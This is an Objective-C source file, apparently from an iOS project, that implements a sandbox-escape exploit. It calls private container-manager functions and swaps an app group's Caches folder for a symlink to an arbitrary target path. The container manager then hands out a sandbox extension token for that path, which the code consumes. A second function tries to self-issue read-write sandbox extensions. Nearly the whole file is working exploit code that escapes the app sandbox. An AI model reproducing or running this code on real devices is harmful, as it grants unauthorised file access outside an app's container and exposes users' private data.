//
//  worse_query.m
//  IOSurfaceSafeProbe
//
//  Based on worse_query by Taj C (forcequit) - GPL-3.0
//

#import <Foundation/Foundation.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <xpc/xpc.h>
#include <sys/stat.h>
#include "worse_query.h"

typedef void *(*container_query_create_fn)(void);
typedef void (*container_query_set_class_fn)(void *, uint64_t);
typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
typedef void (*container_query_set_flags_fn)(void *, uint64_t);
typedef void (*container_query_set_part_fn)(void *, uint64_t);
typedef void *(*container_query_get_single_result_fn)(void *);
typedef void (*container_query_free_fn)(void *);
typedef char *(*container_copy_sandbox_token_fn)(void *);
typedef int64_t (*sandbox_extension_consume_fn)(const char *);
typedef int (*sandbox_extension_release_fn)(int64_t);
typedef char *(*sandbox_extension_issue_file_fn)(const char *, const char *, uint32_t);

static void clean_symlink(NSString *group) {
    if (!group) return;
    NSFileManager *fm = [NSFileManager defaultManager];
    NSURL *groupRoot = [fm containerURLForSecurityApplicationGroupIdentifier:group];
    if (!groupRoot) return;
    NSURL *caches = [groupRoot URLByAppendingPathComponent:@"Library/Caches"];
    [fm removeItemAtURL:caches error:nil];
    [fm createDirectoryAtURL:caches withIntermediateDirectories:NO attributes:nil error:nil];
}

int64_t worse_query(NSString *target, NSString *group, bool alt_flags, bool create_dir) {
    NSLog(@"[WQ] START target=%@ group=%@ alt=%d createDir=%d", target, group, alt_flags, create_dir);

    if (!create_dir) {
        struct stat st;
        if (lstat(target.fileSystemRepresentation, &st) != 0) {
            NSLog(@"[WQ] lstat FAILED errno=%d (%s)", errno, strerror(errno));
            NSLog(@"[WQ] Skipping lstat check, proceeding anyway");
        } else {
            NSLog(@"[WQ] lstat OK mode=0%o", st.st_mode);
        }
    }

    NSFileManager *fm = [NSFileManager defaultManager];
    NSURL *groupRoot = [fm containerURLForSecurityApplicationGroupIdentifier:group];
    if (!groupRoot) {
        NSLog(@"[WQ] containerURL returned nil for group=%@", group);
        return -1;
    }
    NSLog(@"[WQ] groupRoot=%@", groupRoot.path);
    NSString *caches = [[groupRoot URLByAppendingPathComponent:@"Library/Caches"] path];

    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) { NSLog(@"[WQ] dlopen FAILED"); return -2; }

    container_query_create_fn query_create = dlsym(mgr, "container_query_create");
    container_query_set_class_fn query_set_class = dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn query_set_group_identifiers = dlsym(mgr, "container_query_set_group_identifiers");
    container_query_set_flags_fn query_set_flags = dlsym(mgr, "container_query_operation_set_flags");
    container_query_set_part_fn query_set_part = dlsym(mgr, "container_query_operation_set_part");
    container_query_get_single_result_fn query_get_single_result = dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn query_free = dlsym(mgr, "container_query_free");
    container_copy_sandbox_token_fn copy_sandbox_token = dlsym(mgr, "container_copy_sandbox_token");
    sandbox_extension_consume_fn consume = dlsym(RTLD_DEFAULT, "sandbox_extension_consume");

    if (!query_create || !query_set_class || !query_set_group_identifiers ||
        !query_set_flags || !query_set_part || !query_get_single_result ||
        !query_free || !copy_sandbox_token || !consume) {
        NSLog(@"[WQ] dlsym FAILED: create=%p class=%p grpid=%p flags=%p part=%p single=%p free=%p token=%p consume=%p",
              query_create, query_set_class, query_set_group_identifiers,
              query_set_flags, query_set_part, query_get_single_result,
              query_free, copy_sandbox_token, consume);
        dlclose(mgr);
        return -2;
    }
    NSLog(@"[WQ] All symbols resolved OK");

    uint64_t flags = alt_flags ? 0x0000000800000000ULL : 0x0000008000000000ULL;
    NSLog(@"[WQ] flags=0x%llx", flags);

    // Create query (match original order: query first, then symlink)
    void *query = query_create();
    if (!query) { dlclose(mgr); return -3; }
    NSLog(@"[WQ] query=%p", query);

    xpc_object_t identifier = xpc_string_create(group.UTF8String);
    query_set_class(query, 7);
    query_set_group_identifiers(query, identifier);
    query_set_part(query, 3);
    query_set_flags(query, flags);
    NSLog(@"[WQ] Query configured: class=7 part=3");

    // Set up symlink AFTER query config (matches original exploit order)
    NSError *rmErr = nil;
    [fm removeItemAtPath:caches error:&rmErr];
    NSLog(@"[WQ] remove caches: %@", rmErr ? rmErr.localizedDescription : @"OK");

    NSError *symlinkErr = nil;
    BOOL symlinkOK = [fm createSymbolicLinkAtPath:caches withDestinationPath:target error:&symlinkErr];
    if (!symlinkOK) {
        NSLog(@"[WQ] symlink FAILED: %@", symlinkErr);
        query_free(query);
        dlclose(mgr);
        clean_symlink(group);
        return -4;
    }
    NSLog(@"[WQ] symlink OK: %@ -> %@", caches, target);

    // Send query
    void *result = query_get_single_result(query);
    if (!result) {
        NSLog(@"[WQ] get_single_result returned NULL");
        query_free(query);
        clean_symlink(group);
        dlclose(mgr);
        return -5;
    }
    NSLog(@"[WQ] result=%p", result);

    char *token = copy_sandbox_token(result);
    if (!token) {
        NSLog(@"[WQ] copy_sandbox_token returned NULL (kernel refused)");
        query_free(query);
        clean_symlink(group);
        dlclose(mgr);
        return -6;
    }
    NSLog(@"[WQ] GOT TOKEN len=%zu", strlen(token));

    int64_t handle = consume(token);
    NSLog(@"[WQ] consume handle=%lld", handle);
    query_free(query);
    free(token);
    dlclose(mgr);
    clean_symlink(group);

    return handle;
}

int64_t worse_query_issue_self(NSString *target) {
    sandbox_extension_issue_file_fn issue = dlsym(RTLD_DEFAULT, "sandbox_extension_issue_file_to_self");
    sandbox_extension_consume_fn consume = dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    if (!issue || !consume) return -2;

    const char *classes[] = {
        "com.apple.app-sandbox.read-write",
        "com.apple.app-sandbox.read",
        "com.apple.sandbox.container",
    };

    for (int i = 0; i < 3; i++) {
        char *token = issue(classes[i], target.fileSystemRepresentation, 0);
        if (token) {
            int64_t h = consume(token);
            free(token);
            if (h > 0) return h;
        }
    }
    return -8;
}

void worse_query_release(int64_t handle) {
    if (handle <= 0) return;
    sandbox_extension_release_fn rel = dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (rel) rel(handle);
}
